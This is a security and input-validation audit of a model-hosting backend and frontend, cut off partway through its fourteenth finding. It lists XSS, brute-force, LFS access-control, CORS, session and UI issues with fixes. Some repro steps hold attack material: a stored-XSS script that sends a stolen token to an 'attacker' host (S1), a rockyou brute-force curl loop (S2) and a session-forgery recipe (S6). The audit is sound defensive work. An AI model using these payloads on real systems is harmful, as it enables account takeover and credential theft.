# Security, Input Validation, and Error-State UX Audit Findings

Target commit: `feat/todo-batch` (working tree as of the audit)
Scope: `backend/internal/{api,auth,config,lfs,storage,store,gitrepo,gitserver,webhooks}`, `frontend/{app,components,lib}`

## Summary

| Severity | Count |
|---|---|
| High | 3 |
| Medium | 12 |
| Low | 4 |
| Total | 19 |

### Top 3 fixes to prioritize

1. **[S1] `resolve` serves files inline using guessed Content-Type** —
   pushing a single `.html` / `.svg` to a public repository is enough to achieve stored XSS on the
   API origin, and reaches **account takeover** (issuing tokens, reading private data) via a
   same-origin fetch plus the `tf_session` cookie.
2. **[S2] No rate limiting or brute-force protection anywhere** — both `/api/v1/auth/login` and
   the HTTP Basic auth accepted on every endpoint are unbounded. An instance where the default
   `admin` / `admin` credentials remain will fall to a brute-force attack immediately. On top of
   that, unauthenticated callers can hammer bcrypt (cost 10) indefinitely, giving a CPU exhaustion
   DoS as well.
3. **[S3] LFS object access control isn't scoped per repository** —
   the batch download / proxy download / commit paths' `lfsFile` only check whether an oid
   exists in the bucket and never consult `repo_lfs_objects`. Anyone who knows an oid can
   **fetch the contents of someone else's private repository through their own repository**.

### Areas checked with no findings (no need to re-investigate)

- **SQL injection**: `internal/store` goes through placeholders everywhere. `buildRepoWhere`'s
  `bind()` also always lowers values into `$N`. The only string concatenation involves package
  constants (`edge_kind` / `LIMIT` constants).
- **Path traversal (read paths)**: `resolve` / `tree` / `raw` / `parquet` / `model-meta` all just
  look up entries in the go-git tree (`root.FindEntry`) and never touch the filesystem, so `../`
  has no effect. The bare repository's physical location comes from the DB-derived
  `storage_path` (a ULID); client-supplied strings never reach it.
- **Path validation on the commit path**: `gitrepo.validatePath` rejects NUL bytes, empty
  segments, `.`, `..`, and case-insensitive `.git`. Branch names also go through
  `plumbing.ReferenceName.Validate()`.
- **Webhook SSRF**: in addition to `webhooks.ValidateTargetURL`'s check at registration time, the
  delivery Transport's `DialContext` re-validates **the IP it actually connected to** (rejecting
  loopback / private / link-local / unspecified). Redirect-following goes through the same Dial,
  so 169.254.169.254 can't be reached that way either. Keep-alive is also disabled.
- **git smart HTTP / SSH permission checks**: `handleInfoRefs` switches between read/write based
  on the service, `handleReceivePack` uses `loadRepoForWrite`, and SSH's `ServeGit`
  (`api/gitssh.go`) shares the same `canRead` / `canWriteIgnoringArchive` / archive checks.
  Private repos get the same 404-equivalent wording over SSH too.
- **Leakage from private repository listing / stats / lineage**: `ListRepos` / `Stats` /
  `ListRepoLineage` / `ListLineageDependents` / `ListRunDependents` all take a `ViewerID` and
  apply the `NOT r.private OR owner OR org_members` visibility predicate. Facet counts go through
  the same WHERE clause.
- **Token scoping**: token issuance/deletion, SSH key registration/deletion, repository creation,
  commit, and LFS upload all go through `requireWrite` / `canWrite`
  (`currentScope == "write"`); there's no privilege-escalation path from a read-scoped token.
- **LFS oid validation**: `lfs.ValidOID` / `gitrepo.ValidOID` enforce `^[0-9a-f]{64}$`, preventing
  arbitrary strings from entering the storage key. The proxy href's HMAC signature uses
  `subtle.ConstantTimeCompare` plus `exp` validation.
- **XSS (frontend)**: `react-markdown` is used without `rehype-raw`, and `urlTransform` falls back
  to `defaultUrlTransform`. `dangerouslySetInnerHTML` appears only for the constant script in
  `app/theme-script.tsx`.
- **Open redirect**: `lib/validation.ts`'s `safeRedirectPath` compares origins via a URL parser
  and rejects forms like `/\evil.com` too.
- **`middleware.RealIP` not used**: this is documented with a rationale in `server.go` and is
  appropriate.

---

## Findings

### [S1] (Severity: High) `resolve` serves repository files inline with a guessed Content-Type, enabling stored XSS on the API origin

- **Location**:
  - `backend/internal/api/resolve.go:69-85` (sets `Content-Type` directly from
    `mime.TypeByExtension`'s result and `io.Copy`s the body)
  - `backend/internal/api/git.go:257-260` (`handleLFSProxyDownload` also lacks `nosniff`)
  - Nowhere in the codebase sets `X-Content-Type-Options` / `Content-Disposition` /
    `Content-Security-Policy`
    (`grep -rn "nosniff\|Content-Disposition\|Content-Security-Policy" backend/` returns no hits)
- **Problem**: `GET /{ns}/{name}/resolve/{rev}/{path}` returns a git blob's raw contents to the
  browser with a `Content-Type` guessed from the extension. `.html` becomes `text/html`, `.svg`
  becomes `image/svg+xml`, and either lets a script execute in the browser. Neither
  `Content-Disposition: attachment` nor `nosniff` is set. The GCS signed-URL path (LFS content)
  does set `attachment` in `storage/gcs.go:102-106`, but **only the direct git-blob-serving path
  is missing this protection**.
- **Attack scenario / repro steps**:
  1. The attacker pushes `poc.html` to any public repository (their own is fine). Its contents:
     `<script>fetch('/api/v1/tokens',{method:'POST',credentials:'include',body:'{"name":"x","scope":"write"}'}).then(r=>r.json()).then(t=>fetch('https://attacker/'+t.token))</script>`.
  2. Get a logged-in victim (holding `tf_session`) to visit
     `http://<api-host>/models/attacker/poc/resolve/main/poc.html`.
  3. Because the script executes on the API origin, it can issue a write-scoped personal access
     token using `tf_session` (HttpOnly cookies are still auto-attached to fetch; since the fetch
     originates from a top-level same-origin navigation, `SameSite=Lax` allows it too) and
     exfiltrate it externally. From there, reading/writing private repositories and even deleting
     repositories become possible.
  4. Same result with `.svg` (`<svg onload="...">`). Getting it clicked as an image embedded in a
     README is also easy.
- **Suggested fix**:
  1. Make `handleResolve`'s Content-Type decision an allowlist. Return
     `text/plain`, `application/json`, `application/octet-stream`,
     `image/png|jpeg|gif|webp`, and other "won't execute" types as-is; fall everything else
     (`text/html`, `image/svg+xml`, `application/xhtml+xml`, `application/xml`, `text/xml`, etc.)
     back to `application/octet-stream`.
  2. Also always set `w.Header().Set("X-Content-Type-Options", "nosniff")` and
     `w.Header().Set("Content-Disposition", "attachment; filename="+strconv.Quote(path.Base(filePath)))`
     (`resolve` is the HF client's download path, and inline display is already handled by the
     UI's `raw` endpoint, which returns JSON and is safe, so there's no compatibility impact).
  3. Add the same two headers to `handleLFSProxyDownload` (`git.go:257`).
  4. As a durable fix, add a security-headers middleware to `Handler()` (can be merged with [S10]).
- **How to verify**:
  - A table test in `backend/internal/api`: create a repository containing `.html` / `.svg` /
    `.xhtml`, then confirm `GET .../resolve/main/x.html`'s response headers are
    `application/octet-stream` + `nosniff` + `attachment`.
  - A regression test confirming `.parquet` / `.json` / `.png` downloads still work as before.
  - Confirm `hf_hub_download` / `datasets.load_dataset()` aren't broken via `make test-e2e`
    (`Content-Disposition` can affect the client's filename decision, so this is essential).

---

### [S2] (Severity: High) No rate limiting on login or HTTP Basic auth, enabling brute force and CPU-exhaustion DoS

- **Location**:
  - `backend/internal/api/auth.go:283-298` (`handleLogin`)
  - `backend/internal/api/auth.go:47-57` (`resolveIdentity`'s Basic auth handling, enabled on
    **every route**)
  - `backend/internal/api/server.go:112-136` (no rate limiting anywhere in the middleware chain)
  - `backend/internal/config/config.go:15` (`DefaultAdminPassword = "admin"`),
    `backend/cmd/thinkingface/main.go:258-265` (only logs a warning; startup continues)
- **Problem**: there's no limit on authentication attempts, no account lockout, and no failure
  logging (`grep -rni "ratelimit\|throttle\|httprate" backend/` finds no hits in the codebase).
  On top of that, `identify` accepts `Authorization: Basic` on **every endpoint**, running
  `auth.CheckPassword` (bcrypt cost 10) whenever the password doesn't start with `tf_`.
- **Attack scenario / repro steps**:
  1. `for p in $(cat rockyou.txt); do curl -s -o /dev/null -w '%{http_code}\n' -X POST
     http://host/api/v1/auth/login -d "{\"username\":\"admin\",\"password\":\"$p\"}"; done`
     — runs with no limit. If the default password `admin` is still set, it succeeds on the
     first try.
  2. The same thing works with `curl -u admin:$p http://host/api/whoami-v2`, and this one blends
     into CLI traffic and doesn't stand out in the logs.
  3. DoS: sending requests in parallel with `Authorization: Basic <base64(existing-user:junk)>`
     forces one bcrypt cost-10 hash (tens of ms of CPU) per unauthenticated request. A single
     Cloud Run instance saturates at a few dozen rps.
- **Suggested fix**:
  1. Add an in-memory token bucket keyed on IP + username to `backend/internal/api`
     (pure Go, either `golang.org/x/time/rate` or a local implementation — no CGo needed).
     - `POST /api/v1/auth/login` and `POST /api/v1/auth/signup`: count failures, and once a
       single IP exceeds 10/min or a single username exceeds 5/min, return `429` +
       `{"error":{"type":"rate_limited","message":...}}` with `Retry-After`.
     - `resolveIdentity`'s Basic-password branch: count failures against the same bucket, and
       once the threshold is exceeded, return `nil` immediately without running bcrypt (cutting
       off the CPU exhaustion). The `tf_`-prefixed token path (a single SHA-256) doesn't need
       this.
  2. It's fine to assume a single process (the same constraint as SQLite mode), but for
     multi-replica deployments, document in `docs/thinkingface-design.md` §14 that "rate
     limiting is instance-local."
  3. If `TF_ADMIN_PASSWORD` is still the default **and** `TF_PUBLIC_URL` starts with `https://`
     (implying production), refuse to start instead of just warning. Local `docker compose`
     usage stays on http, so it isn't affected.
- **How to verify**:
  - Send 11 consecutive wrong passwords to `handleLogin` and confirm the 11th gets a 429.
  - Confirm the counter resets after a successful login with the correct password.
  - Confirm `CheckPassword` isn't called once Basic-auth failures exceed the threshold (give a
    fake password checker a call counter).
  - Confirm `make test-e2e` passes (E2E sends many requests from the same IP, so this verifies
    that successful requests don't count toward the limit).

---

### [S3] (Severity: High) LFS object reads don't verify repository ownership

- **Location**:
  - `backend/internal/lfs/lfs.go:193-206` (`Batch`'s download branch -> `objectExists` only
    checks the bucket)
  - `backend/internal/lfs/lfs.go:216-228` (`objectExists`)
  - `backend/internal/api/git.go:226-261` (`handleLFSProxyDownload`; checks read access to
    `repoID` but not oid ownership)
  - `backend/internal/api/commit.go:184-202` (`lfsFile` acceptance only checks `storage.Stat`)
  - Meanwhile an ownership table does exist: `backend/internal/store/files.go:120`
    (`repo_lfs_objects`)
- **Problem**: LFS content is content-addressed and shared across the whole instance
  (`storage.LFSKey(oid)`), and download authorization only checks whether the caller can read
  **some** repository. Whether that oid **belongs to that repository** is never checked. As
  `deleteRepo` (`repos.go:301`) notes ("LFS blobs can be shared, so keep them"), an oid survives
  even after its repository is deleted.
- **Attack scenario / repro steps**:
  1. The attacker learns, through some means, the sha256 (= LFS oid) of a file in the victim's
     private repository. Realistic sources: (a) a repository that was originally public and was
     later made private (`_id`/`siblings[].lfs.oid` lingers in old responses or caches), (b) a
     former collaborator who kept the oid after leaving, (c) a file whose contents are guessable,
     such as a derivative of a public dataset.
  2. The attacker creates their own public repository `attacker/x` and sends
     `POST /models/attacker/x/info/lfs/objects/batch` with
     `{"operation":"download","objects":[{"oid":"<victim's oid>","size":<size>}]}`.
  3. `objectExists` checks the whole bucket, so it returns true, and a GCS signed GET URL
     (default TTL 1 hour) for `lfs/xx/yy/<oid>` comes back. **The private repository's content
     is retrievable.**
  4. The reverse also works: `commit.go`'s `lfsFile` accepts based purely on oid existence, so an
     attacker can commit a pointer referencing someone else's oid into their own repository,
     making it retrievable via `resolve` from then on.
- **Suggested fix**:
  1. Add a store method to `lfs.Handler` that asks "does this repoID own this oid"
     (`store.RepoHasLFSObject(ctx, repoID, oid) (bool, error)` — checks for a row in
     `repo_lfs_objects`).
  2. In `Batch`'s `operation == "download"` branch, run this ownership check before
     `objectExists`, and if not owned, return the per-object
     `{"code":404,"message":"object <oid> not found"}` as the LFS spec requires (don't fail the
     whole batch).
  3. Add the same ownership check to `handleLFSProxyDownload`'s (`git.go:236`) `canRead` fallback
     path used when signature verification fails. Signed hrefs are only ever issued for oids
     that passed the ownership check in the batch call, so the signed path is fine as-is.
  4. `commit.go`'s `lfsFile` should, in addition to `storage.Stat`, confirm "this oid is already
     linked to one of the caller's writable repositories, or was verified in this session." The
     simplest and safest approach is **requiring a `(repo.ID, oid)` row to already exist in
     `repo_lfs_objects`** (the normal flow already produces this via
     preupload -> LFS batch upload -> verify -> `RecordLFSObject`). Existing dedup (re-pushing to
     the same repository) is unaffected by this condition.
  5. Document in `docs/api-contract.md` §"LFS Batch" that "only oids linked to the repository are
     downloadable."
- **How to verify**:
  - Integration test in `internal/api`: upload an LFS file to repository A -> request a download
    batch for the same oid from repository B (a different user) -> confirm a per-object 404.
  - Confirm duplicate upload to the same repository (dedup) still succeeds with no `actions`.
  - Send a `commit` with an `lfsFile` pointing at another repository's oid and confirm a 400.
  - Confirm `make test-e2e`'s LFS round trip (`hf upload` / `snapshot_download`) hasn't regressed.

---

### [S4] (Severity: Medium) CORS reflects any Origin while returning `Allow-Credentials: true`, with no CSRF token either

- **Location**: `backend/internal/api/server.go:284-304` (`cors` middleware)
- **Problem**: the `Origin` header is reflected as-is into `Access-Control-Allow-Origin`, and
  `Access-Control-Allow-Credentials: true` is set. There's no config option for an allowed-origin
  list. `OPTIONS` returns 204 regardless of authentication or route matching. The only reason the
  actual damage is limited today is that `tf_session` is `SameSite=Lax` (`auth.go:277`) and
  doesn't ride along on cross-site fetches — the moment a single cookie attribute changes, every
  API endpoint becomes readable/writable from any site. There's no CSRF token as defense in depth
  either.
- **Attack scenario / repro steps**: under the current Lax assumption, this can't be exploited
  immediately (**that's the only backstop**). However, (a) a future switch to `SameSite=None`, or
  (b) getting a victim to visit a trap page right after login, within Chrome's "Lax + POST"
  2-minute grace period, would each make `POST /api/v1/tokens` (issuing a write token) or
  `DELETE /api/v1/repos/...` exploitable.
- **Suggested fix**:
  1. Add `AllowedOrigins []string` to `config.Config` (`TF_ALLOWED_ORIGINS`, comma-separated;
     default to the web origin equivalent to `PublicURL` and `NEXT_PUBLIC_API_URL`).
  2. `cors` should only return `Access-Control-Allow-Origin` and `Allow-Credentials` when
     `origin` is on the allowlist. Return no CORS headers at all for a non-matching Origin (the
     request itself can still go through — `huggingface_hub` / git don't send Origin, so this
     doesn't affect them).
  3. Add middleware requiring that `Origin` (or `Referer` if absent) matches the allowlist for
     non-GET `/api/v1/**` requests that mutate state via a cookie session (exempt Bearer/Basic
     authenticated requests, since the CLI doesn't send Origin).
  4. Consider raising `SameSite` in `auth.go:277` to `http.SameSiteStrictMode` (no real downside
     if the post-login redirect stays same-origin).
- **How to verify**:
  - Confirm `Access-Control-Allow-Origin` isn't set on a preflight with a disallowed Origin.
  - Confirm `POST /api/v1/tokens` with `Origin: https://evil.example` plus the cookie returns 403.
  - Confirm `POST /api/v1/tokens` with no `Origin` header plus `Authorization: Bearer` still
    returns 200 as before.
  - Confirm `make test-e2e` passes (the Python client doesn't send Origin).

---

### [S5] (Severity: Medium) Sessions can't be revoked (logout and password change don't invalidate them)

- **Location**:
  - `backend/internal/auth/auth.go:66-109` (`Sessions` is a stateless `userID.exp.hmac` signature
    only)
  - `backend/internal/api/auth.go:335-338` (`handleLogout` only clears the client-side cookie)
  - `backend/cmd/thinkingface/main.go:32` (`sessionTTL = 30 * 24 * time.Hour`)
- **Problem**: since the session value is never recorded server-side, an issued cookie **can't be
  revoked by anyone for 30 days**. It stays valid after logout, and existing sessions survive a
  password change. The only containment option in a breach is "rotate `TF_SESSION_SECRET` and
  force-logout every user."
- **Attack scenario / repro steps**: once a session value is captured, whether via a shared
  machine or XSS ([S1]), the victim remains accessible for 30 days even after logging out or
  changing their password.
- **Suggested fix**:
  1. Lowest-cost option: add `session_epoch INTEGER NOT NULL DEFAULT 0` to `users`, and make the
     cookie value `userID.epoch.exp.hmac`. `Verify` only passes when it matches the DB's current
     epoch. Increment the epoch on logout and on password change (add migrations to both
     `store/migrations/postgres/` and `store/migrations/sqlite/`).
  2. Shorten the TTL from 30 days to around 7 days, and slide-refresh via `setSessionCookie` when
     `Verify` sees less than half the TTL remaining (sliding session).
  3. Document in `docs/api-contract.md` §1's `POST /api/v1/auth/logout` that "this also revokes
     server-side."
- **How to verify**:
  - `internal/api` test: login -> save cookie -> logout -> `GET /api/v1/me` with the saved
    cookie returns 401.
  - `auth` package unit test confirming an epoch mismatch yields `ErrBadSession`.

---

### [S6] (Severity: Medium) The `Secure` attribute depends on the `TF_PUBLIC_URL` string, and the server still starts with the default secret

- **Location**:
  - `backend/internal/api/auth.go:278` (`Secure: strings.HasPrefix(s.cfg.PublicURL, "https://")`)
  - `backend/internal/config/config.go:16,113` (`DefaultSessionSecret = "dev-insecure-session-secret"`)
  - `backend/cmd/thinkingface/main.go:262-264` (warning only)
- **Problem**: in a deployment where TLS termination is handled by a load balancer, a misconfigured
  `TF_PUBLIC_URL` silently drops `Secure`, and the session cookie travels in plaintext — a
  misconfiguration that fails silently. The default signing key is a public value, so if it's
  still in place, **an attacker can forge a session cookie for an arbitrary user ID**
  (`Issue` is just an HMAC over `userID.exp`). Startup still proceeds with only a warning.
- **Attack scenario / repro steps**: if exposed on an internal network with `TF_SESSION_SECRET`
  unset, an attacker only needs to construct
  `1.<a future unix timestamp>.<base64url of HMAC-SHA256("dev-insecure-session-secret", "1.<exp>")>`
  and place it in `tf_session` to become user ID 1 (usually the seeded admin).
- **Suggested fix**:
  1. Add `CookieSecure *bool` (`TF_COOKIE_SECURE`) to `config.Config`, falling back to inferring
     from `PublicURL` only when unset.
  2. If `TF_SESSION_SECRET` is still the default **and** `PublicURL` starts with `https://`
     (implying production), fail `config.Load()` with an error. Localhost/http development
     environments keep the current warning-only behavior.
  3. Also enforce a minimum length (32 bytes) for `SessionSecret`.
- **How to verify**: add table-test cases to `internal/config` for "https + default secret ->
  error" and "http + default secret -> success + warning."

---

### [S7] (Severity: Medium) Signing up with a password over 72 bytes returns a 500

- **Location**:
  - `backend/internal/api/auth.go:317-325` (only checks an 8-character minimum, no maximum)
  - `backend/internal/auth/auth.go:32-38` (`bcrypt.GenerateFromPassword`)
  - bcrypt in `golang.org/x/crypto v0.55.0` returns `ErrPasswordTooLong` above 72 bytes
- **Problem**: a user who enters a passphrase (around 24 Japanese characters already exceeds 72
  bytes) gets **a 500 `hash password failed`** via `internalError(w, "hash password", err)`.
  There's no indication of the cause, and the frontend displays the raw English message as-is —
  a textbook case of a missing input check surfacing directly as a server error.
- **Attack scenario / repro steps**:
  `curl -X POST /api/v1/auth/signup -d '{"username":"u","email":"u@e.com","password":"'$(python3 -c 'print("a"*80)')'"}'`
  -> `500 {"error":{"message":"hash password failed","type":"internal_error"}}`.
- **Suggested fix**:
  1. Add `if len(req.Password) > 72 { badRequest(w, "password must be at most 72 bytes"); return }`
     to `handleSignup` (right after the `len(req.Password) < 8` check).
  2. Add minimal validation for `req.Email` too (non-empty, contains `@`, at most 256 bytes) —
     currently an account can be created with an empty string.
  3. Add `validatePassword` to `frontend/lib/validation.ts` and reject before the round trip in
     the signup tab of `login-form.tsx`. Add the wording as
     `errors.passwordTooLong` in `lib/i18n/dictionaries/{en,ja}/auth.ts`.
  4. Document in `docs/api-contract.md` §1's signup section that "password must be 8-72 bytes."
- **How to verify**: `internal/api` test confirming a 73-byte password gets a 400, and exactly 72
  bytes gets a 200. Add an equivalent case to `lib/validation.test.ts`.

---

### [S8] (Severity: Medium) `handleEditFile` alone bypasses `decodeJSON`, breaking the error contract

- **Location**: `backend/internal/api/edit.go:83-86`
- **Problem**: every other JSON endpoint uses `decodeJSON` (`errors.go:40`), which turns
  oversized bodies into `413 payload_too_large` and parse failures into a 400 that
  **doesn't include the decoder's raw text**. This one spot calls
  `json.NewDecoder(...).Decode` directly instead, so:
  - an oversized body (over 2MB) becomes `400 bad_request` instead of `413`
  - `badRequest(w, "request body must be JSON: "+err.Error())` returns the decoder's internal
    message verbatim (behavior explicitly forbidden by the comment in `errors.go:36-39`)
  Similarly, `commit.go:126,152,176` also return `err.Error()`, but that's a separate case since
  it's NDJSON and can't use `decodeJSON` (even so, the message should still be sanitized).
- **Attack scenario / repro steps**: sending a 3MB body to
  `PUT /api/v1/edit/model/ns/name/main/README.md` returns 400 instead of 413, and the frontend
  displays the raw message as a generic error, since it's "neither conflict nor 413."
- **Suggested fix**:
  1. Replace `edit.go:83-86` with
     `if !decodeJSON(w, r, maxEditBytes, &req, "request body must be JSON with a content field") { return }`.
  2. In `commit.go`'s three spots, stop concatenating `err.Error()` and use fixed wording instead
     (`"commit body must be newline-delimited JSON"` / `"invalid file entry"` /
     `"invalid lfsFile entry"`).
  3. Note the 413 case in `docs/api-contract.md` §"File editing".
- **How to verify**: add a test to `internal/api/edit_test.go` confirming a body of 2MB+1 byte
  returns `413 payload_too_large`, and that malformed JSON doesn't leak the decoder's text.

---

### [S9] (Severity: Medium) `paths-info`'s `paths` array has no size cap, enabling anonymous amplified DoS

- **Location**: `backend/internal/api/repotree.go:179-216`
- **Problem**: as long as it fits within `maxBatchBody` (8MB), `paths` can have unlimited
  elements, and each element triggers `gitRepo.Stat(rev, p)` (= commit resolution + tree walk,
  possibly a blob read). It also swallows errors via
  `_ = json.NewDecoder(...).Decode(&req)`, so a malformed body doesn't become a 400 — instead it
  becomes a 200 with an empty `paths` (this is the second spot that bypasses `decodeJSON`).
  A public repository can be hit **without authentication**.
- **Attack scenario / repro steps**: pack roughly 500,000 `paths` into an 8MB JSON body and send
  it to `POST /api/models/{ns}/{name}/paths-info/main`. A single request triggers 500,000 tree
  lookups, and just a few concurrent requests saturate the API process. In WAL-authoritative
  mode, `git.Open`'s materialization makes this even heavier.
- **Suggested fix**:
  1. Define `const maxPathsInfoPaths = 1000`, returning
     `badRequest(w, "paths may contain at most 1000 entries")` if exceeded (in practice
     `huggingface_hub`'s `get_paths_info` never goes over this).
  2. Enforce a length cap on each `p` (e.g. 4096 bytes) and reject NUL bytes.
  3. Route body decoding through `decodeJSON` (if empty bodies need to remain allowed, note that
     explicitly and only tolerate `io.EOF`).
  4. `handleHFTree`'s `recursive=true` is similarly heavy on large repositories, so consider a
     cap on entry count too (e.g. cut off at 100,000 entries and return `truncated`).
- **How to verify**: `internal/api` test confirming 1001 `paths` entries returns 400, and 1000
  returns 200. Confirm `make test-e2e`'s `snapshot_download`-family tests pass.

---

### [S10] (Severity: Medium) No security headers are set anywhere, on either the API or Next.js

- **Location**:
  - `backend/internal/api/server.go:112-136` (middleware chain)
  - `frontend/next.config.ts` (no `headers()` defined)
- **Problem**: none of `X-Content-Type-Options` / `X-Frame-Options` (or CSP `frame-ancestors`) /
  `Referrer-Policy` / `Content-Security-Policy` are sent. This leaves [S1]'s MIME sniffing,
  clickjacking (tricking a user into clicking the settings page's "delete" button via a
  transparent iframe), and Referer leakage to external sites (private repository paths appear in
  the URL) all unmitigated.
- **Attack scenario / repro steps**: the attacker overlays
  `<iframe src="http://host/models/victim/x/settings">` on their page and tricks the victim into
  clicking "archive" or "delete" (delete requires typed confirmation, but archive commits with a
  single click).
- **Suggested fix**:
  1. Add a `securityHeaders` middleware to `server.go` that sets
     `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and
     `Referrer-Policy: strict-origin-when-cross-origin` on every response
     (right after `s.cors`, before `s.identify`).
  2. Add `async headers()` to `frontend/next.config.ts` that sets the same three headers on every
     path, plus
     `Content-Security-Policy: default-src 'self'; img-src 'self' data: <API origin>;
     connect-src 'self' <API origin>; frame-ancestors 'none'`. Note that Next.js's inline script
     (`app/theme-script.tsx`) will need nonce support (an acceptable starting point is landing
     just `frame-ancestors` and `nosniff` first, and splitting the full CSP into a separate task).
- **How to verify**: `internal/api` test confirming the three headers appear on an arbitrary
  endpoint's response. Leave a documented procedure in `docs/` for checking the frontend with
  `curl -I` after `bun run build`.

---

### [S11] (Severity: Medium) `ErrorState`'s default title is hardcoded English, violating the i18n convention

- **Location**:
  - `frontend/components/ui/error-state.tsx:4` (`title = "Couldn't load this"`)
  - About 20 call sites rely on the default title. Main ones:
    `components/repo-pages/repo-overview.tsx:43`, `repo-tree.tsx:48,73`, `repo-blob.tsx:55,92,94`,
    `repo-commits.tsx:58,114`, `repo-viewer.tsx:43,89`, `repo-edit.tsx:44`,
    `repo-settings.tsx:38`, `components/repo/repo-list-page.tsx:126`,
    `components/namespace/namespace-overview.tsx:116,137,158`,
    `components/repo/transfer-repo-form.tsx:161,165`, `app/page.tsx:118`
- **Problem**: `frontend/DESIGN.md` §7 states "user-visible strings must always come from the
  dictionary," but the heading of the most visible error screen is hardcoded English. It shows
  "Couldn't load this" even under the Japanese locale. `bun run check:ui` doesn't check this
  rule, so CI doesn't catch it either.
- **Attack scenario / repro steps**: set `tf_locale=ja`, stop the API, and open `/datasets/foo/bar`
  — the error card appears with an English-only heading.
- **Suggested fix**:
  1. Make `ErrorState`'s `title` a required prop (remove the default). Pass it in via
     `await getT()` from Server Components and `useT()` from Client Components. Note that since
     `ErrorState` is called from both Server and Client Components, it can't itself call
     `useT()` internally.
  2. Add `ui.errorStateTitle` (en: `"Couldn't load this"` / ja: `"読み込めませんでした"`) to
     `lib/i18n/dictionaries/en/common.ts` / `ja/common.ts`, and pass
     `title={t("ui.errorStateTitle")}` at all ~20 call sites above.
  3. Check `EmptyState` for the same kind of hardcoding at the same time.
- **How to verify**: confirm `bun run typecheck` flags every call site missing `title`
  (mechanically guaranteeing zero omissions). Confirm both en and ja have the key via
  `lib/i18n/index.test.ts`'s key-consistency test.

---

### [S12] (Severity: Medium) Backend English error messages get shown on screen as-is via `result.message`

- **Location** (representative examples):
  - `frontend/components/repo-pages/repo-overview.tsx:43`, `repo-tree.tsx:48`, `repo-blob.tsx:55`,
    and other `ErrorState message={result.message}` sites
  - `frontend/components/auth/login-form.tsx:54` (`setError(result.message)`)
  - `frontend/components/repo/create-repo-form.tsx:71`, `repo-danger-zone.tsx:58,73`, and various
    `setError(result.message)` calls throughout `components/settings/*.tsx`
- **Problem**: the `message` returned by `apiFetch` is an English string assembled on the Go side
  (`"repository foo/bar not found"` / `"you do not have write access to ..."` /
  `"repository_archived ..."`). It's displayed as-is even under the Japanese locale, violating
  `frontend/DESIGN.md` §7's "all user-visible strings come from the dictionary" and leaving
  locale switching effectively half-functional.
- **Attack scenario / repro steps**: under `tf_locale=ja`, trying to edit a file in an archived
  repository shows the raw
  `xxx is archived and read-only; unarchive it in the repository settings to make changes`
  right inside the Japanese UI.
- **Suggested fix**:
  1. Extend `lib/api.ts:118-121` so `ApiResult`'s error branch also carries `type` (the backend's
     `error.type`, i.e. `errBody?.error?.type`). `apitypes.ApiError` already has `type`, so no
     API contract change is needed.
  2. Create `lib/i18n/dictionaries/{en,ja}/errors.ts` defining wording per backend `type` value
     (`not_found` / `forbidden` / `unauthorized` / `conflict` / `repository_archived` /
     `repo_moved` / `payload_too_large` / `internal_error` / `bad_request` / `rate_limited`).
  3. Add `errorMessage(t, result): string` to `lib/api-error-message.ts`, returning the dictionary
     entry when `type` has one, otherwise falling back to `result.message` (English fallback).
     Give `status === 0` (backend unreachable) its own dedicated wording.
  4. Replace the call sites above with `errorMessage(t, result)`. For cases like `bad_request`
     where the server's specific detail ("name must be ...") has value, combine dictionary
     wording with the detail (dictionary text + specifics).
- **How to verify**: `lib/api-error-message.test.ts` verifying the per-type mapping and the
  unknown-type fallback. Missing ja dictionary entries are caught by the existing
  `lib/i18n/index.test.ts`.

---

### [S13] (Severity: Medium) Confirmation UI for destructive actions is inconsistently split between `window.confirm` and Dialog

- **Location**:
  - Using `window.confirm`:
    `frontend/components/settings/tokens-manager.tsx:70` (access token deletion),
    `frontend/components/settings/ssh-keys-manager.tsx:76` (SSH key deletion),
    `frontend/components/settings/webhook-row.tsx:82` (webhook deletion)
  - Using a dedicated Dialog plus typed confirmation:
    `frontend/components/repo/repo-danger-zone.tsx:126-162` (repository deletion, requires typing
    `ns/name`), `frontend/components/experiments/run-delete-dialog.tsx:49-77` (run deletion,
    requires typing the run name)
  - Executed immediately with no confirmation:
    `frontend/components/repo/repo-danger-zone.tsx:93-105` (archive / unarchive)
- **Problem**: three different weights of UI coexist for the same category of "irreversible
  deletion." `window.confirm` isn't theme-aware (it's the OS dialog regardless of light/dark),
  the app can't control its focus management, and it strays from `frontend/DESIGN.md` §5's
  "new visuals go in `ui/`" policy. Archiving strips `can_write` from everyone yet requires no
  confirmation at all.
- **Attack scenario / repro steps**: mostly accidental clicks. Webhook deletion is especially
  costly to recover from, since the secret can't be reissued.
- **Suggested fix**:
  1. Add a new `components/ui/confirm-dialog.tsx`. Props:
     `{ open, onClose, onConfirm, title, description, confirmLabel, tone?, requireText? }`.
     Only show a text input when `requireText` is passed, keeping the confirm button disabled
     until it matches (lift the implementation straight out of
     `repo-danger-zone.tsx:126-162`).
  2. Replace `window.confirm` in `tokens-manager` / `ssh-keys-manager` / `webhook-row` with
     `ConfirmDialog` (no `requireText`). The wording can reuse the existing
     `settings.*.confirmDelete` keys.
  3. Rewrite `repo-danger-zone` / `run-delete-dialog` using `ConfirmDialog` (with `requireText`).
  4. Add a `ConfirmDialog` (no `requireText`) around the archive action too. Unarchiving is
     harmless, so it can stay immediate as-is.
  5. Add `ConfirmDialog` to the table in `frontend/DESIGN.md` §5.
- **How to verify**: since `bun run check:ui` doesn't check for `window.confirm`, add a
  "`window.confirm` / `window.alert` forbidden" rule to `scripts/check-ui.mjs` for mechanical
  prevention going forward (set up an allowlist shaped like `RAW_BUTTON_ALLOWLIST`). Add
  component tests for each manager confirming DELETE doesn't fire until confirmed.

---

### [S14] (Severity: Medium) No `error.tsx` / `global-error.tsx` anywhere, so unexpected exceptions fall through to Next.js's default screen

- **Location**: no `error.tsx` / `global-error.tsx` exists anywhere under `frontend/app/`
  (`loading.tsx` also exists in only two places: `app/[ns]/` and
  `app/experiments/[ns]/[repo]/[project]/[run]/`)
- **Problem**: per CLAUDE.md invariant 3, `apiFetch` never throws, so **API-driven** exceptions
  can't happen — but exceptions during rendering (parquet value formatting, `uplot`
  initialization, unexpected input to `react-markdown`, non-API exceptions inside Server
  Components) have nothing to catch them, and production falls through to Next.js's bare
  "Application error" screen (unstyled, English, no language switching). The header and
  navigation disappear too, leaving the user with no way back.
- **Attack scenario / repro steps**: a corrupted parquet file or an oversized cell value throwing
  during client-side formatting turns the whole page blank.
- **Suggested fix**:
  1. Add `frontend/app/error.tsx` (a Client Component, `"use client"`) showing `ErrorState` plus
     "retry" (`reset()`) and "go home" actions. Add the wording under
